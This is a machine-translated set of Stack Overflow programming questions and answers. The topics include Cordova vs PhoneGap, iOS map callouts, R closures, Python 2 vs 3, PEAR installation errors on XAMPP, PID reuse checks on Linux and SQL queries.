到目前为止，我还没有找到“简单的英语”解释 Apache Cordova 和 PhoneGap 之间的区别，以及何时使用它们中的任何一个。

我正在寻找使用其中一个构建应用程序，并且我有以下限制：

*   需要开源（最好是GPL、APL2等）
*   它需要有一个好的开发社区支持它（最好是好的文档）
*   它需要采用相同的 javaScript 并使用它为 Android、iOS、Windows Phone 和 Blackberry 生成本机二进制文件（一次编写，随处运行）

如果这两个库/SDK 都可以满足这些要求，那么我如何确定要使用哪个项目？这是“詹金斯/哈德森”的事情还是他们真的是两个独立的项目？提前致谢！

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-09-09T07:01:29.487

PhoneGap 最初是 Nitobi 的一个开源项目，用于将 HTML5 代码打包到本地“包装器”中，以创建移动应用程序。[Adobe 收购了 Nitobi](http://www.adobe.com/aboutadobe/pressroom/pressreleases/201110/AdobeAcquiresNitobi.html)和 PhoneGap 技术。Adobe 继续将 PhoneGap 代码贡献给 Apache 软件基金会，以确保它保持开源。此时名称已更改为 Cordova，Adobe 保留 PhoneGap 名称和品牌。

Adobe 计划以 PhoneGap 的名义为 Cordova 增加价值，例如添加工具支持和服务，例如[PhoneGap Build](https://build.phonegap.com/)。

目前许多人仍然使用 PhoneGap 名称来描述开源框架（可能是因为它是一个更好的名称！），但随着时间的推移，这可能会随着 Adob​​e 建立在 PhoneGap 品牌和产品系列上而改变。

从开发人员的角度来看，这是一个非常好的情况，该框架仍然是开源的，但如果您想要增加价值，您需要向 Adob​​e 付费。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-09-07T13:04:12.393

> 目前，唯一的区别在于下载包的名称，并且会在一段时间内保持不变。
> 
> PhoneGap 是 Apache Cordova 的一个发行版。您可以将 Apache Cordova 视为支持 PhoneGap 的引擎，类似于 WebKit 是支持 Chrome 或 Safari 的引擎。

资料来源： [http ://www.meetup.com/The-London-Dreamweaver-Meetup-Group/pages/Difference_between_Apachie_Cordova_and_Phone_Gap/](http://www.meetup.com/The-London-Dreamweaver-Meetup-Group/pages/Difference_between_Apachie_Cordova_and_Phone_Gap/)

此外，PhoneGap 满足您指定的所有要求。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-09-28T09:13:51.463

**历史**

*   2009 年左右 - *Nitobi*创建了 PhoneGap 框架。
*   2011 年 9 月 - Nitobi 将 PhoneGap 代码捐赠给 Apache 软件基金会。
*   2011 年 10 月 - Nitobi 宣布已被 Adob​​e 收购。Adobe 支持开源 PhoneGap 的代码。由于法律原因，有人建议重命名该项目。
*   2012 年 2 月 - 由 Apache 维护的项目更名为“<strong> *Cordova* ”，以 Nitobi 所在的温哥华 Cordova 街命名。

**差异**

Apache Cordova 是进行开发和贡献的核心开源项目。

Adobe PhoneGap 是 Apache Cordova 的一个发行版，它还提供与 Adob​​e 的实用程序和服务的集成，例如 PhoneGap Build。

Cordova 和 PhoneGap 非常相似，它们的名称经常互换使用。Apache Cordova 接收更新的速度稍微快一些，界面稍微简单一些，并且缺乏与 Adob​​e 服务的开箱即用集成。

**使用哪一个？**

您打算使用 Adob​​e 的服务吗？选择 Adob​​e 的 PhoneGap。如果没有，Apache Cordova 可能更适合您。

# ios - xcode 地图引脚标注

> ID：12318425
> 
> 赞同：0
> 
> 时间：2012-09-07T12:45:59.230
> 
> 标签：ios, mapkit

我正在尝试向我的别针添加标注。这是我的第一个带有地图标注的应用程序，我需要帮助将所有图钉标注指向外部视图。

```
-(MKAnnotationView *) mapView:(MKMapView *)mapView viewForAnnotation:(id<MKAnnotation>)annotation {
    MKPinAnnotationView *MyPin=[[MKPinAnnotationView alloc] initWithAnnotation:annotation reuseIdentifier:@"current"];
    MyPin.pinColor = MKPinAnnotationColorPurple;

    UIButton *advertButton = [UIButton buttonWithType:UIButtonTypeDetailDisclosure];
    [advertButton addTarget:self action:@selector(button:) forControlEvents:UIControlEventTouchUpInside];

    MyPin.rightCalloutAccessoryView = advertButton;
    MyPin.draggable = NO;
    MyPin.highlighted = YES;
    MyPin.animatesDrop=TRUE;
    MyPin.canShowCallout = YES;

    return MyPin;
} 
```

触摸蓝色箭头内部时如何添加外部视图？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-10-29T23:43:53.617

在您的`- (MKAnnotationView *)mapView:(MKMapView *)mapView viewForAnnotation:(id <MKAnnotation>)annotation`方法中，尝试以下方式：

```
// Add button to callout
UIButton* advertButton = [UIButton buttonWithType:UIButtonTypeDetailDisclosure];
pinView.rightCalloutAccessoryView = advertButton; 
```

（在此示例中，`pinView`是您从该方法返回的视图）

然后，在同一个类中添加一个方法：

```
-(void)mapView:(MKMapView *)mapView annotationView:(MKAnnotationView *)view calloutAccessoryControlTapped:(UIControl *)control {
    id <MKAnnotation> annotation = [view annotation];

    if ([annotation isKindOfClass:[MKPointAnnotation class]])
    {
        // TRANSITION TO VIEW HERE
    }
} 
```

处理这个的类应该是一个代表`MKMapViewDelegate`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-20T03:53:22.700

自从我这样做以来已经有一段时间了，但我认为您需要一个 NSObject 用于地图对象。我在使用地图编写最后一个应用程序时使用[了本](http://www.raywenderlich.com/21365/introduction-to-mapkit-in-ios-6-tutorial)教程，它帮助很大。不过可能已经过时了。或者，您可以在 Google 地图网站上构建自定义地图并解析 kml 数据，这会固有地使用名称制作标注气泡，然后您可以从那里将标注编码得更复杂。另一个替代方案是 MapBox，它是一个独立的库，既简单又美观，并且有很多示例项目。 [这](https://stackoverflow.com/questions/7164469/ios-mapkit-custom-callout)可能是一个相关的 SO 问题，其中包含有关制作自定义标注配件的代码。

# r - 从闭包生成值向量

> ID：12318427
> 
> 赞同：1
> 
> 时间：2012-09-07T12:46:06.767
> 
> 标签：r

这种类型的事情在 F# 中很容易，但我不知道如何在 R 中做到这一点。我想生成一个带有从闭包生成的值的向量。在 F# 中，它的工作原理是这样的。第一个参数是你想要的元素数量，第二个是闭包的迭代器，最后一个参数是生成值的闭包。在 R 中这样的事情可能吗？我一直在 F# 中使用它。

```
result <- GenerateVector(5, n, function(n){
    n*10
}) 
```

会导致：

```
result =
10
20
30
40
50 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T13:19:18.970

根据我的评论，如果不需要第二个参数（即您*不需要*指定迭代器是什么），那么我们可以这样写`GenerateVector()`：

```
GenerateVector <- function(x, FUN) {
    do.call(FUN, list(seq_len(x)))
}

R> GenerateVector(5, FUN = function(n) {n*10})
[1] 10 20 30 40 50 
```

这是否对您更有效取决于是否`FUN`是矢量化函数（如您的示例）。当然，如果您使用不接受向量的函数，您会遇到严重的低效率问题，因此这可能不是一个太大的问题。

一般来说，使用普通的 R 约定来编写这些东西要容易得多：

```
R> 1:5 * 10
[1] 10 20 30 40 50
R> foo <- function(n) n * 10
R> foo(1:5)
[1] 10 20 30 40 50 
```

在我`do.call()`的示例中所做的就是为您编写上面的最后两行 R 代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:18:56.160

可能类似的东西`sapply`可能会这样做：

```
sapply(1:5, function(n)10*n)
[1] 10 20 30 40 50 
```

相似之处在于`sapply`将列表作为输入，将函数应用于该列表中的每个元素，并在列表中返回结果。由于列表本身就是一个向量，因此您可以对输入向量执行相同的操作。

在这个例子中，我们使用`:`操作符来构造一个向量序列。

# python - 对 Python 2 和 Python 3 之间的选择感到困惑

> ID：12318437
> 
> 赞同：9
> 
> 时间：2012-09-07T12:46:51.010
> 
> 标签：python, python-3.x, python-2.x

我来自 Ruby，在决定安装和使用 Python 2.x 还是 Python 3.x 时遇到了麻烦我猜这个选择取决于我想使用的平台和框架，但是我怎样才能找到兼容或不兼容 Python 3 的程序？这可能会帮助我摆脱这个困境。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-07T12:53:31.507

如果您正在寻找学习新事物，并且不想制作“今天必须工作”类型的项目，请尝试 Python3。使用 Python3 进入未来会更容易，因为随着时间的推移它将成为标准。

如果你正在做一些快速而肮脏的东西，你通常会在 Python 2.7 中获得更好的库支持。

最后，如果您使用的任何东西都包含完整的 unicode 支持，请不要卖空自己——选择 Python3。仅 unicode 的简化是值得的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T12:51:33.593

PyPI 让您通过[Python 3 分类器](https://pypi.python.org/pypi?%3aaction=browse&c=533&show=all)选择包。

虽然这是一个很大的列表，但不一定很有帮助。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-07T12:51:37.280

Python 包索引 (PyPI) 列出了[与 Python 3 兼容的包](http://pypi.python.org/pypi?%3aaction=browse&c=533&show=all)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-07T12:53:20.853

如今，很多库都支持 Python 3。这些库没有一个列表，因此您必须检查您想要使用的框架以实现 Python 3 兼容性。有些仅在某些 beta 阶段支持 Python 3，但这并不意味着它们不好。

我现在将从 Python 3 开始，看看你会得到什么。只有当你知道你需要支持你在其他不受控制的平台上开发的任何东西时，从 Python 2 开始可能会更好。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-07T12:58:25.617

此时，如果您需要的特定库在 3.x 中可用，我将开始告诉人们使用 3.x。如果您在 Windows 上开发，这里有一个很好的[二进制文件](http://www.lfd.uci.edu/~gohlke/pythonlibs/)列表。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-09-07T12:59:24.563

[http://python3wos.appspot.com/](http://python3wos.appspot.com/)

这是一个关于哪些软件包与 python 3 兼容的酷网站。

# ios - 防止在 iPad 上意外关闭 U IActionSheet

> ID：12318440
> 
> 赞同：2
> 
> 时间：2012-09-07T12:47:01.967
> 
> 标签：ios, ipad, ios5, uiactionsheet

我正在使用 UIActionSheet 在 iPad 应用程序中向用户呈现两个选项。用户选择一个或其他选项，UIActionSheetDelegate 处理其余的。但是，如果用户不小心点击了 iPad 屏幕上的任何其他位置，UIActionSheet 会自动关闭，并且两个选项都不会被选中。如何防止 UIActionSheet 自动关闭，从而强制用户选择两个选项之一？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:23:27.467

如果 Action Sheet 在 UIPopover 内，解决方法是使用 UIPopoverDelegate 来阻止 popover 在存在 action sheet 时关闭。另一种解决方案是使用 UIAlertView 代替，除了与警报交互之外，它不会允许任何事情发生。可能不是您的解决方案。如果您触摸屏幕的不同部分，我不知道 UIActionSheet 会自行关闭的任何其他方式。

当操作表可见时创建一个 BOOL 变量

```
BOOL actionSheetVisible; //in header file

//in @implementation file
-(void)displayAlert {
    actionSheetVisible = YES;
    //code to display UIAction sheet...
}

#pragma mark PopoverControllerDelegate method
-(BOOL)popoverControllerShouldDismissPopover:(UIPopoverController *)popover {
    if (actionSheetVisible) {
        return NO;
    }
    return YES;
}

#pragma mark UIAlerViewDelegate
...actionSheet:(UIActionSheet *)sheet selectedObjectAtIndex:(NSUInteger)index { ... //not sure what this method is at the moment
    actionSheetVisible = NO;
    //handle action sheet
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:27:15.897

将手势控制器添加到什么都不做的应用程序窗口怎么样？或者尝试将其添加到工作表下方的视图中？确保完成后将其删除；）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T13:42:31.093

I'll throw out another idea - just before you show the action sheet, add a transparent view that covers the whole screen to the window, and set view. userInteractionEnabled = NO, then remove the view when the action sheet is dismissed. [I didn't test this on iPad but have used this technique on the phone]

# html - 嵌套 div 中的 z-index

> ID：12318442
> 
> 赞同：1
> 
> 时间：2012-09-07T12:47:11.227
> 
> 标签：html, css

我有以下问题：

我有 3 个 div，其中 2 个有 position:fixed; 但是，由于它们不在同一个 DOM 级别，z-index 不起作用-

请参见

[http://jsfiddle.net/hCFzS/](http://jsfiddle.net/hCFzS/)

我正在尝试将红色 div 移到所有内容之上，但它不起作用。你能帮助我吗？

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-07T12:49:14.053

div 没有正确关闭。你忘了一个`>`

结果：[jsFiddle](http://jsfiddle.net/hCFzS/1/)。现在它在上面。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T13:27:15.750

将 html 更新为

```
<div id="nav"></div>
<div id="container">
    <div id="div1"></div>
    <div id="div2"></div>
</div>​ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T12:50:33.647

[jsfiddle](http://jsfiddle.net/wigster/YSqBB/)为你修复了它。
添加`top:0`和`left:0`将定位到整个身体的左侧和顶部。`nav`还正确关闭了元素的 div 。

# solr - 按非搜索字段加权 Solr 得分

> ID：12318443
> 
> 赞同：2
> 
> 时间：2012-09-07T12:47:12.027
> 
> 标签：solr

我在架构中包含了一个字段，该字段不是正在搜索的字段，但我想通过该字段的整数值对结果进行加权。

我很难在任何地方的文档中看到如何做到这一点？这种行为是在查询阶段还是索引阶段实现的，如何实现？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:34:29.150

您可以使用[基于字段的提升](http://wiki.apache.org/solr/SolrRelevancyFAQ#Field_Based_Boosting)，它可以让您基于字段提升结果。
该字段不必是被搜索的字段。

您还可以为字段[增加索引时间](http://wiki.apache.org/solr/SolrRelevancyFAQ#index-time_boosts)

例如[How_can_I_boost_the_score_of_newer_documents](http://wiki.apache.org/solr/SolrRelevancyFAQ#How_can_I_boost_the_score_of_newer_documents)

如果您使用[Dismax](http://lucidworks.lucidimagination.com/display/solr/The+DisMax+Query+Parser)，您可以使用[boost query](http://wiki.apache.org/solr/DisMaxQParserPlugin#bq_.28Boost_Query.29)或[boost function](http://wiki.apache.org/solr/DisMaxQParserPlugin#bf_.28Boost_Functions.29)。

[使用 Document boost 来增加分数](http://lucene.apache.org/core/3_6_0/api/all/org/apache/lucene/search/Similarity.html)

> 在索引时，用户可以通过分配文档提升来指定某些文档比其他文档更重要。为此，每个文档的分数也乘以其提升值 doc-boost(d)。

![在此处输入图像描述](../Images/e0c6e945d589aa8c11a671b0d8e9395a.png)

# linux - 如何确保正在运行的进程是我期望正在运行的进程？

> ID：12318445
> 
> 赞同：8
> 
> 时间：2012-09-07T12:47:14.413
> 
> 标签：linux, bash, shell, process, pid

**上下文**：

我有一个 linux[1] 系统，它管理一系列第三方守护进程，与这些守护进程的交互仅限于 shell[2] 初始化脚本，即只有 {start|restart|stop|status} 可用。

**问题**：

进程可以假定先前运行的进程的 PID，通过使用它的 PID 检查正在运行的进程的存在来检查进程的状态。

**示例**：

进程 A 使用 PID 123 运行，随后死亡，进程 B 使用 PID 123 进行初始化，并且状态命令以不真实的（错误的）“OK”响应。换句话说，我们只从它的 PID 中检查一个进程的存在以验证该进程是否正在运行，我们假设如果存在具有此 PID 的进程，它就是有问题的进程。

**建议的解决方案**：

1.  使用 PID 询问进程，以确保命令/守护程序按预期运行。这个方案的问题是命令和PID都需要匹配；因此需要维护和保持多位信息同步，并增加错误/边缘条件的复杂性。
2.  将 PID 文件的创建时间与进程的启动时间相关联，如果进程在 PID 文件创建时间的某个增量内，我们可以相当肯定命令/守护程序运行是预期的。

除了存在使用该 PID 运行的进程之外，是否有一种标准方法来批准进程/PID 文件的真实性？即我（作为系统）想知道您（进程）是否正在运行，以及您是否是我认为的您（A 而不是 B）。

假设我们选择实施上面提出的第二种解决方案，PID 创建时间和进程启动时间之间的置信区间/增量是多少是合理的？在这里，合理意味着类型 1 / 类型 2 错误之间可接受的折衷。

[1] CentOS/RHEL [2] 重击

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-07T12:56:21.883

文件内容：

> /proc/{PID}/cmdline

是用于启动进程的命令行。那是你需要的吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-06-17T23:08:35.493

我正在寻找问题的答案*如何确保一个进程仍然是同一个进程*，我想到了这个问题的两个*解决方案*，即一个进程是否可以由元组（pid，命令）或（pid，进程开始时间）。但遗憾的是，这两种选择似乎都不够。

1.  (pid, command) 是不够的，因为 pid 重用，例如，原始进程可能已经被杀死，并且 pid 空闲以供重用，具有相同命令行的另一个进程可能已经使用该 pid 启动。

2.  (pid, process start time) 似乎有时会出现启动时间少量变化的问题。

现在，另一个选项来自能够*更改进程标题*，例如，我们可以在您的进程标题中放入一个随机数，并将随机数与 pid 一起存储在 pidfile 中。那么当我们要检查进程是否还是同一个进程时，例如要杀死它，我们可以检查pid文件的pid的进程标题是否仍然以pid文件中的随机数开头。

为了便于说明，请考虑这个简短的 python 片段，类似的功能应该可以通过其他语言的库获得：

```
#!/usr/bin/env python3
import os, setproctitle
nonce = bytes.hex(os.urandom(8))                      # create hex nonce
setproctitle.setproctitle(nonce + " " + setproctitle.getproctitle()) # set title
with open("run.pid", "w"): f.write(pid + " " + nonce) # store pid and nonce in pidfile 
```

连同这个shell脚本一起杀掉进程，如果还是一样。

```
#!/bin/sh
PID=$(cat run.pid | cut -f1 -d" ")     # get pid from pidfile
NONCE1=$(cat run.pid | cut -f2- -d" ") # get nonce from pidfile
NONCE2="$(ps -p "$PID" -o command= 2> /dev/null | cut -f1 -d" ")" # get nonce from process title
if [ "$NONCE1" = "$NONCE2" ]; then     # if nonces equal
  kill "$PID"                          # kill process
  echo "killed"
else                                   # otherwise the process you wanted to kill
  echo "was already dead"              # has been dead anyway
fi 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-04-07T05:17:33.420

我的解决方案是捕获命令（通过`/proc/PID/cmdline`）以及*相对*开始时间。使用[绝对开始时间](https://stackoverflow.com/q/5731234/113632)（通过`ps -p PID -o lstart=`）可能会起作用，但[如果您的系统时钟发生变化](https://unix.stackexchange.com/q/274721/19157)（例如来自 NTP 更新或夏令时），您会得到令人困惑的结果。

这是我的实现：

```
# Prints enough detail to confirm a PID still refers to the same process.
# In other words, even if a PID is recycled by a call to the same process the
# output of this command should still be different. This is not guaranteed
# across reboots.
proc_detail() {
  local pid=${1:?Must specify PID}
  # the process' commandline, if it's running
  # ensures a non-existant PID will never have the same output as a running
  # process, and helps debugging
  cat "/proc/$pid/cmdline" 2> /dev/null && echo
  # this is the number of seconds after boot that the process started
  # https://unix.stackexchange.com/a/274722/19157
  # in theory this could collide if the same process were restarted in the same
  # second and assigned the same PID, but PIDs are assigned in order so this
  # seems acceptably unlikely for now.
  echo "$(($(cut -d. -f1 < /proc/uptime) - \
           $(ps -p "$pid" -o etimes= 2> /dev/null || echo "0")))"
} 
```

我还决定存储此输出，`/dev/shm`以便在关机时自动为我清除。还有其他可行的选项（例如`@reboot`cronjob），但对于我的用例而言，写入a 既`tmpfs`简单又干净。

# php - PEAR 包安装失败

> ID：12318446
> 
> 赞同：9
> 
> 时间：2012-09-07T12:47:15.973
> 
> 标签：php, console, phpunit, package, pear

我尝试安装软件包`from pear.phpqatools.org/phpqatools`

首先命令`pear config-get php_dir`返回`D:\Users\xampp\php\pear` ，我无权在`C`驱动器上安装。

然后根据[http://phpqatools.org/](http://phpqatools.org/)的说明 输入：

```
pear config-set auto_discover 1
pear install pear.phpqatools.org/phpqatools 
```

我也尝试过输入： `pear install --alldeps pear.phpqatools.org/phpqatools`

但所有这些尝试的结果都是失败......

这是一个日志：

```
Package "pear.phpqatools.org/phpqatools" dependency "pear.phpunit.de/PHPUnit" has no releases
Unknown remote channel: pear.pdepend.org
Unknown remote channel: pear.phpmd.org
Unknown remote channel: components.ez.no
Package "pear.phpunit.de/PHPUnit_SkeletonGenerator" dependency "pear.phpunit.de/Text_Template" has
no releases
Package "pear.phpunit.de/phpcpd" dependency "pear.phpunit.de/File_Iterator" has no releases
Package "pear.phpunit.de/phpcpd" dependency "pear.phpunit.de/PHP_Timer" has no releases
Unknown remote channel: components.ez.no
Package "pear.phpunit.de/phploc" dependency "pear.phpunit.de/File_Iterator" has no releases
Unknown remote channel: components.ez.no
Package "pear.phpqatools.org/PHP_CodeBrowser" dependency "pear.phpunit.de/File_Iterator" has no rel
eases
Failed to download pear/Text_Highlighter within preferred state "stable", latest release is version
 0.7.3, stability "beta", use "channel://pear.php.net/Text_Highlighter-0.7.3" to install
Package "pear.phpqatools.org/PHP_CodeBrowser" dependency "pear.phpunit.de/PHPUnit" has no releases
Package "pear.phpqatools.org/PHP_CodeBrowser" dependency "pear.php.net/PhpDocumentor" has no releas
es
Package "pear.php.net/PHP_CodeSniffer" dependency "pear.phpunit.de/PHP_Timer" has no releases
Package "pear.phpunit.de/DbUnit" dependency "pear.phpunit.de/PHPUnit" has no releases
Package "pear.phpunit.de/DbUnit" dependency "pear.symfony-project.com/YAML" has no releases
WARNING: "pear/DB" is deprecated in favor of "pear/MDB2"
WARNING: "pear/Auth_SASL" is deprecated in favor of "pear/Auth_SASL2"
phpqatools/phpqatools requires package "channel://pear.pdepend.org/PHP_Depend"
phpqatools/phpqatools requires package "channel://pear.phpmd.org/PHP_PMD"
phpunit/PHPUnit_SkeletonGenerator requires package "channel://components.ez.no/ConsoleTools" (versi
on >= 1.6)
phpunit/phpcpd requires package "channel://components.ez.no/ConsoleTools" (version >= 1.6)
phpunit/phploc requires package "channel://components.ez.no/ConsoleTools" (version >= 1.6)
phpunit/phploc can optionally use PHP extension "bytekit"
phpqatools/PHP_CodeBrowser can optionally use package "pear/Text_Highlighter" (version >= 0.7.1)
downloading PHP_CodeBrowser-1.0.3.tgz ...
Starting to download PHP_CodeBrowser-1.0.3.tgz (172,253 bytes)
.....................................done: 172,253 bytes
downloading PHP_CodeSniffer-1.3.6.tgz ...
Starting to download PHP_CodeSniffer-1.3.6.tgz (352,931 bytes)
...done: 352,931 bytes
downloading DbUnit-1.1.2.tgz ...
Starting to download DbUnit-1.1.2.tgz (41,895 bytes)
...done: 41,895 bytes
downloading Console_CommandLine-1.1.3.tgz ...
Starting to download Console_CommandLine-1.1.3.tgz (38,507 bytes)
...done: 38,507 bytes
downloading Log-1.12.7.tgz ...
Starting to download Log-1.12.7.tgz (46,898 bytes)
...done: 46,898 bytes
downloading DB-1.7.14.tgz ...
Starting to download DB-1.7.14.tgz (133,103 bytes)
...done: 133,103 bytes
downloading MDB2-2.4.1.tgz ...
Starting to download MDB2-2.4.1.tgz (119,790 bytes)
...done: 119,790 bytes
downloading Mail-1.2.0.tgz ...
Starting to download Mail-1.2.0.tgz (23,214 bytes)
...done: 23,214 bytes
downloading Net_SMTP-1.6.1.tgz ...
Starting to download Net_SMTP-1.6.1.tgz (13,164 bytes)
...done: 13,164 bytes
ERROR: failed to mkdir C:\php\pear\tests\PHP_CodeSniffer\CodeSniffer\Core\File
ERROR: failed to mkdir C:\php\pear\docs\DbUnit\Samples\BankAccountDB\_files
ERROR: failed to mkdir C:\php\pear\data\Console_CommandLine\data
ERROR: failed to mkdir C:\php\pear\docs\Log\docs
ERROR: failed to mkdir C:\php\pear\docs\DB\doc
ERROR: failed to mkdir C:\php\pear\docs\MDB2\docs\examples
ERROR: failed to mkdir C:\php\pear\tests\Mail\tests
ERROR: failed to mkdir C:\php\pear\docs\Net_SMTP\docs
ERROR: failed to mkdir C:\php\pear\data\PHP_CodeBrowser\templates\css 
```

我不明白为什么 install 会尝试 mkdir on`C:\php\pear\`以及如何解决未知删除通道的问题...

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-07T13:43:06.420

我发现使用 Xamp 时让 pear 工作的唯一方法是删除文件夹并从头开始重新安装。pear 客户端（很长一段时间以来都是非常损坏的 1.9.2 版本）即使在例外位置也无法正常工作，但是当您在其他地方安装 xamp 时没有理智的方法来修复它，因为路径设置到许多文件。

按照[http://pear.php.net/manual/en/installation.getting.php](http://pear.php.net/manual/en/installation.getting.php)上的指南进行操作。

下载 [**`http://pear.php.net/go-pear.phar`**](http://pear.php.net/go-pear.phar)，执行它，选择`system`广泛安装并将所有路径调整到您的位置。

一旦它起作用并且`pear version`报告`1.9.4`使用

```
pear config-set auto_discover 1
pear install --force --alldeps pear.phpqatools.org/phpqatools 
```

“修复”旧安装遗留下来的任何东西。

* * *

只需使用该版本的 pear 也可以解决您所有的包和通道问题。

它，由于某种原因，不使用

```
pear channel-discover $everyChannelThatDoesNotWork
pear channel-update $thatChannel 
```

对于被报告为问题的所有内容。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2016-10-04T08:32:55.023

如果像我一样，运行所有 pear config-set 命令仍会导致此错误：

> 未能 mkdir C:\php\pear\tests\PHP_CodeSniffer\CodeSniffer\Core\File

然后有一个简单的解决方案，我花了一段时间才弄清楚：

**以管理员身份运行终端**

真的，这就是解决方案。然后就像其他人说的：在您的终端中转到 c:\xampp\php 并输入以下命令：

```
pear config-set doc_dir C:\xampp\php\pear\docs
pear config-set cfg_dir C:\xampp\php\pear\cfg
pear config-set data_dir C:\xampp\php\pear\data
pear config-set man_dir C:\xampp\php\local\man
pear config-set test_dir C:\xampp\php\pear\tests
pear config-set www_dir C:\xampp\php\pear\www

pear install PHP_CodeSniffer 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-02-28T13:22:22.433

尝试使用以下命令更正配置路径：

```
pear config-show

pear config-create / C:\xampp\php\pear.ini

pear -c c:\xampp\php\pear.ini config-set doc_dir c:\xampp\php\pear\docs
pear -c c:\xampp\php\pear.ini config-set bin_dir c:\xampp\php
pear -c c:\xampp\php\pear.ini config-set ext_dir c:\xampp\php\ext
pear -c c:\xampp\php\pear.ini config-set php_dir c:\xampp\php\pear
pear -c c:\xampp\php\pear.ini config-set cache_dir c:\xampp\php\cache
pear -c c:\xampp\php\pear.ini config-set cfg_dir c:\xampp\php\cfg
pear -c c:\xampp\php\pear.ini config-set data_dir c:\xampp\php\data
pear -c c:\xampp\php\pear.ini config-set download_dir c:\xampp\php\download
pear -c c:\xampp\php\pear.ini config-set php_bin c:\xampp\php\php.exe
pear -c c:\xampp\php\pear.ini config-set temp_dir c:\xampp\php\tmp
pear -c c:\xampp\php\pear.ini config-set test_dir c:\xampp\php\pear\tests
pear -c c:\xampp\php\pear.ini config-set www_dir c:\xampp\php\pear\www

pear -c c:\xampp\php\pear.ini config-show 
```

每个 pear 命令都应该使用`-c c:\xampp\php\pear.ini`参数，例如：

```
pear -c c:\xampp\php\pear.ini config-set auto_discover 1
pear -c c:\xampp\php\pear.ini install pear.phpqatools.org/phpqatools 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-12-07T16:22:10.047

无需手动删除 PEAR 缓存

```
pear clear-cache 
```

无需手动搜索缓存即可清除 pear 缓存。

这解决了我在尝试从 Structures 频道下载包时得到的响应，该频道是

```
 no release for package .... 
```

这向我表明 pear 没有针对已记录为在我的系统上的特定软件包的新版本，尽管没有成功安装。

还使用将*首选状态*从稳定更改为开发

```
pear config-set preferred_state devel 
```

允许安装我需要的所有软件包，其中大部分是 devel 或 alpha

希望这可以帮助某人避免浪费将近一天的时间，这使我无法弄清楚为什么我得到“不发布”响应。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-07T12:56:21.567

Pear 配置不正确。我记得 XAMPP 安装的梨不是开箱即用的。

有关如何正确设置所需变量的指导，请参见[此处。](http://pear.php.net/manual/en/guide.users.commandline.config.php)找到设置为默认值的那些，例如`C:\php\<something>`并将它们更改为 XAMPP 的 pear/php 安装中的文件夹。

# mysql - INSERTS 上的 MySQL 事务行为

> ID：12318450
> 
> 赞同：0
> 
> 时间：2012-09-07T12:47:41.090
> 
> 标签：mysql, transactions

我需要运行一个事务来做“全有或全无”，但我在到达那里时遇到了一些问题。

在下面的示例中，第三个 INSERT 失败，但我插入了前两个。问题是我需要做所有或什么都不做。或全部插入或不插入。

我怎么可能在 MySQL 中做到这一点？我正在使用 InnoDB。

```
START TRANSACTION;
insert into t_orders (id_order, date_begin, date_end) values ('1', '2012-9-08', '2012-9-16');
insert into t_orders_items (id_order, id_order_item, id_item, item_quantity) values ('1', '1', '2', '1');
insert into t_orders_items (id_order, id_order_item, id_item, item_quantity) values ('1', '1', '3', '1');
COMMIT; 
```

一些线索？

此致，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:50:31.397

这取决于您的存储类型。对于 InnoDB 表，这将起作用，但 MyISAM 不支持事务并忽略 START TRANSACTION 语句。将表的存储引擎更改为 InnoDB。这是一个（小）慢一点，但更安全。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-07T12:52:47.590

你有关于这两个表的数据结构的任何细节吗？看起来 t_orders_items 中可能有一个主键或唯一键，并且您正在尝试插入导致事务失败的类似值

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-07T12:53:02.350

这很简单，在表 t_orders_items：id_order 是一个主键，你已经插入了两次相同的值 '1' ..
祝你好运

# sql - SQL Server - 加入查询

> ID：12318452
> 
> 赞同：-3
> 
> 时间：2012-09-07T12:47:44.910
> 
> 标签：sql, sql-server, tsql, sql-server-2005, join

这是我的桌子

```
 StudentID    Name
    ----------   ------
      1          Mary
      2          John
      3          Peter
      4          Edwards

   ClassID      StudentIDs
    --------    -----------
      1          1,2
      2          3,4

    **Output Expected**

    ClassID   Names
    -------   -------

        1      Mary,John
        2      Peter,Edwards 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T15:27:06.503

解决方案并不难，即使您表中的信息似乎也没有正确存储：

```
SELECT  ClassID
       ,(SELECT SUBSTRING((SELECT ',' + Name FROM @TableOne WHERE Students LIKE '%'+CAST(StudentID AS NVARCHAR(5))+'%' ORDER BY Name FOR XML PATH('')),2,200) AS CSV)
FROM @TableTwo 
```

您可以使用此代码（复制/粘贴）作为工作示例：

```
DECLARE @TableOne TABLE
(
    StudentID INT,
    Name NVARCHAR(100)
)

DECLARE @TableTwo TABLE
(
    ClassID INT,
    Students NVARCHAR(100)
)

INSERT INTO @TableOne (StudentID,Name)
VALUES  (1,'Mary')
       ,(2,'John')
       ,(3,'Peter')
       ,(4,'Edwards')
